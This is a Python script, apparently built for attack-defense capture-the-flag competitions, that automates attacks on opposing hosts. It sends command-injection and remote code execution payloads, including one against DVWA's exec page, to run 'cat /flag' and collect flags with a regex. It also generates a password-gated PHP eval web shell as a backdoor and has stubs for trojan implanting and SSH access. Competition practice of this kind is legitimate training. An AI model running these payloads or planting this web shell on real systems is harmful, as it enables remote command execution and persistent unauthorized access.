#!/usr/bin/python3
# -*- coding: UTF-8 -*-
"""
@project    : customGr1m
@file       : Attack.py
@Author     : Gr%1m
@Date       : 14/11/2023 10:56 am
"""
import requests, pymysql
import hashlib
import re

# About Flag
Flags = set()
FlagPath = '/flag'
FlagLen = 41
FlagRegular = r'flag{(\w|-){35}}'

# Payload INFO
RceRelpaceStr = 'XXXRCEstr'
Payloads = [f"GET:::80/js/config.php?s=system('{RceRelpaceStr}');",
            f'POST::/dvwa/vulnerabilities/exec/#?ip=127.0.0.1;{RceRelpaceStr}&submit=submit']
LoginCookie = 'security=low; PHPSESSID=e16f5c982733368120234560b9cb5625'

# Backdoor INFO
BDNameR = "HM_NAME_REPLACE"
BDDataR = "WAIT_FOR_REPLACE"
BDpass = 'x2aom1ng_20231114'

# Enemy INFO
X = 'x'


def up_payloads(data):
    Payloads.append(data)


def get_flag(ey_hosts, rce='cat /flag'):
    for ey in ey_hosts:
        for payload in Payloads:
            method, payload = payload.split('::', maxsplit=1)
            payload = payload.replace(RceRelpaceStr, rce)
            if method == 'GET':
                url = f'http://{ey}{payload}'
                res = requests.get(url=url, headers={'Cookie': LoginCookie})
            else:
                ppath, params = payload.split('?', maxsplit=1)
                url = f'http://{ey}{ppath}'
                data = {_.split('=', maxsplit=1)[0]: _.split('=', maxsplit=1)[1] for _ in params.split('&')}
                res = requests.post(url, data=data, headers={'Cookie': LoginCookie})

            if 'flag{' in res.text:
                flag = re.search(FlagRegular, res.text).group()
                flag = flag.strip()
                Flags.add(flag)
                break
            else:
                pass


def generate_muma():
    bdp_md5 = hashlib.md5(BDpass.encode()).hexdigest()
    xiaoma_file = f"<?php if(md5($_GET['cmd'])=='{bdp_md5}'" + "){@eval($_POST['kAt3l1na']);}?>"
    # todo:
    #   Payloads.append(f"?shell.php?cmd={BDpass}&kAt3l1na=system('{RceRelpaceStr}');")


# Implant Trojan
def backdoor_in():
    pass


def connect_ssh():
    pass


def connect_sql(eyhostsql):
    try:
        conn = pymysql.connect(
            host=eyhostsql.split('@')[1].split(':')[0],
            port=int(eyhostsql.split(':')[-1].split('/')[0]),
            user=eyhostsql.split(':')[1][2:],
            password=eyhostsql.split(':')[2].split('@')[0],
            database='dvwa',
            charset='utf8'  # 字符集，注意不是'utf-8'
        )
    except pymysql.OperationalError as e:
        print(f"[-] {e.__class__.__name__} {e}")
    else:
        return conn
